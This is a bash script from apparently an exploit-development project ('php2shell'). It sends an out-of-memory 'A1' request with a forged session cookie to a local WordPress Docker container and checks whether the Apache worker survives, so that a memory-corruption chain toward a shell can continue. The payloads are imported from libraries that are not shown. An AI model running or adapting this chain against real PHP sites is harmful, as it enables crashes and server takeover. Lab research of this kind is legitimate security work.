#!/usr/bin/env bash
# Controlled comparison: does A1 kill the WordPress worker?
#
# The chain needs the worker to SURVIVE the OOM. On the plain lab it does:
#   worker before: 1 18   worker after: 1 18
# On WordPress the log shows "child pid N exit signal Segmentation fault (11)".
#
# If that holds, the chain cannot complete on WordPress regardless of sessions:
# a dead worker has no dangling PS(id) to reclaim.
set -u
cd "/mnt/d/AI-Hacking/AI Pentest/php2shell/php2shell-scan-exp" || exit 1

say() { printf '\n\033[1m== %s\033[0m\n' "$*"; }

workers() {
  docker exec p2s-wp sh -c 'ps -C apache2 --no-headers 2>/dev/null | wc -l' 2>/dev/null || echo "?"
}

say "restart WordPress cleanly"
docker start p2s-wp >/dev/null 2>&1 || true
for _ in $(seq 1 60); do
  curl -s -m 2 -o /dev/null http://127.0.0.1:18120/ && break
  sleep 1
done
echo "  up"

say "ini values"
docker exec p2s-wp php -i 2>/dev/null | grep -E \
  '^(memory_limit|post_max_size|upload_max_filesize|max_input_vars|max_file_uploads)'

say "plugin state"
docker exec -u www-data p2s-wp wp plugin list --fields=name,status 2>/dev/null | sed 's/^/  /'

say "workers before A1: $(workers)"

say "send A1 (chunked, 78 large fields, forged cookie)"
python3 - <<'PY'
import sys
sys.path.insert(0, "/mnt/d/AI-Hacking/AI Pentest/php2shell/php2shell-scan-exp")
from lib.transport import TransportConfig, send_chunked, get_status_code
from lib.payloads import build_a1_body, QUERY_STRING_128M

cfg = TransportConfig(host="127.0.0.1", port=18120, timeout=180)
cfg.cookie = "PHPSESSID=" + "a" * 32
cfg.inject_cookie = True
body = build_a1_body(big=78)
resp = send_chunked(cfg, "/index.php" + QUERY_STRING_128M, body)
print("  A1 status:", get_status_code(resp), "bytes:", len(resp))
PY

sleep 2
say "workers after A1: $(workers)"

say "php errors from the last 60s"
docker logs p2s-wp --since 60s 2>&1 \
  | grep -E 'Fatal|Segmentation|signal|Allowed memory' | tail -6 | sed 's/^/  /'

say "container state"
docker inspect p2s-wp --format '  status={{.State.Status}} exit={{.State.ExitCode}}'

say "session files"
docker exec p2s-wp sh -c 'ls /tmp/sess_* 2>/dev/null | wc -l' 2>/dev/null | sed 's/^/  count: /'

say "VERDICT"
W=$(workers)
if [ "$W" -ge 2 ] 2>/dev/null; then
  echo "  worker survived -> chain may proceed to B1"
else
  echo "  worker died     -> no PS(id) to dangle, chain cannot complete"
fi
